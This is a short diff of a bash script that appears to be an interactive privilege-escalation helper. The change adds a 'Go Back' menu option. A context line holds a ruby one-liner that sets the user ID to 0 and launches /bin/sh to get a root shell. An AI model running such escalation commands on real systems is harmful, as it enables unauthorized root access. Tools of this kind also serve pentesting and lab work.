@@ -144,6 +144,9 @@ while true; do
                         echo "Trying with ruby"
                         "$choice" -e 'Process::Sys.setuid(0); exec "/bin/sh"'
                         ;;
+                    "Go Back")
+                        break
+                        ;;
                     *)
                         echo "Invalid Choice, Choose From : "
                         printf '%s\n' "$result" | nl -w2 -s') '
